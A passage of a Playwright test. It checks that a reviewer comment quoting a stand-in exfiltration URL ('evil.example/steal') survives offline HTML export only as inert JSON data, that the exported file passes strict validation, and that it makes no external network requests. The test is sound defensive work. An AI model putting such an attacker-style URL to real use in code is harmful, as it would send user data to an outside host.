    expect(legacy, "the legacy untyped shape must be staged").toContain('<script id="handledCommentIds">');
    fs.writeFileSync(staged.html, legacy);

    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await addTextComment(page, "#quote-note", QUOTED_EGRESS_NOTE);
    await openSidebarExportMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml, "the reviewer's words must travel with the file").toContain("evil.example/steal");
    // The singular branch of the inert-data note, which the decoy spec above never reaches.
    await expect(page.locator("#toast")).toContainText(
      "1 script carrying a reserved commentable-html data id was kept as inert data.");

    const exportedPath = path.join(outDir, "offline-quoted-egress.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The exporter and its own strict gate must agree: an untyped block left as-is would fail this,
    // since the validator requires `type="application/json"` for the layer's data blocks.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => {
      const handled = document.getElementById("handledCommentIds");
      const embedded = document.getElementById("embeddedComments");
      return {
        handledType: handled && handled.getAttribute("type"),
        embeddedType: embedded && embedded.getAttribute("type"),
        notes: JSON.parse(embedded.textContent || "[]").map((c) => c.note),
      };
    });
    expect(state.handledType).toBe("application/json");
    expect(state.embeddedType).toBe("application/json");
    expect(state.notes).toEqual([QUOTED_EGRESS_NOTE]);
    await expect(page2.locator("#commentList")).toContainText("evil.example/steal");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});
